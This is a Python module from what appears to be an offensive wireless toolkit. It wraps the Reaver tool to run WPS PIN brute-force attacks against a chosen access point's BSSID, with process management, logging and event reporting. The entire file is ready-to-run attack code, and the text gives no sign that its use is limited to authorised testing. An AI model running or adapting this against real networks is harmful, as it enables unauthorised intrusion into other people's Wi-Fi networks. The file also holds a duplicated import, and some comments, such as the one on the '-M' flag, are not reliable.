# backend/plugins/wps_attack.py
"""
Module: wps_attack
Wraps the Reaver tool to perform WPS brute-force attacks.
"""
import subprocess
import logging
import os
import subprocess
from ..core.event_logger import log_event # Import for event logging

# Configure logging for this module
logger = logging.getLogger(__name__) # Inherits root logger configuration

class WPSAttack:
    def __init__(self, iface: str, target_bssid: str, output_dir: str = '/tmp/reaver_output'):
        logger.info(f"Initializing WPSAttack: iface={iface}, bssid={target_bssid}, output_dir={output_dir}")
        log_event("wps_attack_init", {"interface": iface, "target_bssid": target_bssid, "output_dir": output_dir})
        self.iface = iface
        self.bssid = target_bssid
        self.output_dir = output_dir
        self.process = None # To store the Popen object

        try:
            os.makedirs(self.output_dir, exist_ok=True)
            logger.debug(f"Ensured output directory exists: {self.output_dir}")
        except Exception as e:
            logger.error(f"Failed to create output directory {self.output_dir}: {e}", exc_info=True)
            # Depending on desired behavior, might re-raise or handle gracefully

    def run(self, timeout: int = 3600, multi: bool = False):
        # Construct reaver command
        reaver_log_file = os.path.join(self.output_dir, f'reaver_{self.bssid.replace(":", "")}.log')
        cmd = [
            'reaver',
            '-i', self.iface,
            '-b', self.bssid,
            '-vv',                # Verbose output
            '-d', '5',            # Delay between PIN attempts (seconds)
            # '-t', str(timeout), # Reaver's own timeout for a session; Popen's timeout is different
            '-o', reaver_log_file # Output file for reaver's own logging
        ]
        if multi: # Note: Reaver's -M (multi-threaded) option is for PixieWPS, might not be universally available/effective
            cmd.append('-M')

        logger.info(f"Starting WPS attack. Executing: {' '.join(cmd)}")
        log_event("wps_attack_started", {"interface": self.iface, "target_bssid": self.bssid, "command": ' '.join(cmd), "log_file": reaver_log_file})

        attack_status_payload = {"status": "unknown", "log_file": reaver_log_file, "command": cmd}
        try:
            # Using Popen to manage the process, especially if we want to stream output or manage it actively
            self.process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1, universal_newlines=True)

            logger.info(f"Reaver process started (PID: {self.process.pid}). Output will be logged and saved to {reaver_log_file}.")

            # Stream Reaver's output to logs
            if self.process.stdout:
                for line in iter(self.process.stdout.readline, ''):
                    logger.debug(f"Reaver output: {line.strip()}")

            self.process.wait(timeout=timeout + 60)

            return_code = self.process.returncode
            logger.info(f"WPS attack (Reaver) completed with exit code {return_code}.")
            attack_status_payload.update({"status": "completed", "return_code": return_code})
            log_event("wps_attack_completed", attack_status_payload)
            return attack_status_payload

        except subprocess.TimeoutExpired:
            logger.warning(f"WPS attack (Reaver) command '{' '.join(cmd)}' timed out after {timeout+60}s (Popen timeout). Terminating process.")
            if self.process:
                self.process.terminate()
                try: self.process.wait(timeout=10)
                except subprocess.TimeoutExpired: self.process.kill(); logger.warning("Reaver process force-killed after terminate timeout.")
            attack_status_payload.update({"status": "error", "message": "WPS attack timed out."})
            log_event("wps_attack_failed", attack_status_payload)
            return attack_status_payload
        except FileNotFoundError:
            logger.error(f"Command 'reaver' not found. Please ensure Reaver is installed.", exc_info=True)
            attack_status_payload.update({"status": "error", "message": "'reaver' not found."})
            log_event("wps_attack_failed", attack_status_payload)
            return attack_status_payload
        except Exception as e:
            logger.error(f"An unexpected error occurred during WPS attack with command '{' '.join(cmd)}'", exc_info=True)
            attack_status_payload.update({"status": "error", "message": str(e)})
            log_event("wps_attack_failed", attack_status_payload)
            return attack_status_payload
        finally:
            if self.process and self.process.stdout:
                self.process.stdout.close()
            if self.process and self.process.stderr: # Though stderr is redirected to stdout here
                self.process.stderr.close()
            self.process = None # Clear process reference

    def shutdown(self): # For consistency with other service-like classes
        logger.info("WPSAttack shutdown called.")
        if self.process and self.process.poll() is None: # If process is running
            logger.info(f"Attempting to terminate running Reaver process (PID: {self.process.pid})...")
            self.process.terminate()
            try:
                self.process.wait(timeout=10)
                logger.info("Reaver process terminated.")
            except subprocess.TimeoutExpired:
                logger.warning("Reaver process did not terminate gracefully, killing.")
                self.process.kill()
                logger.info("Reaver process killed.")
            except Exception as e:
                logger.error(f"Error during Reaver process termination: {e}", exc_info=True)
        else:
            logger.info("WPSAttack shutdown: No Reaver process was found running or process already completed.")
        self.process = None
        log_event("wps_attack_shutdown_processed", {"interface": self.iface, "target_bssid": self.bssid})
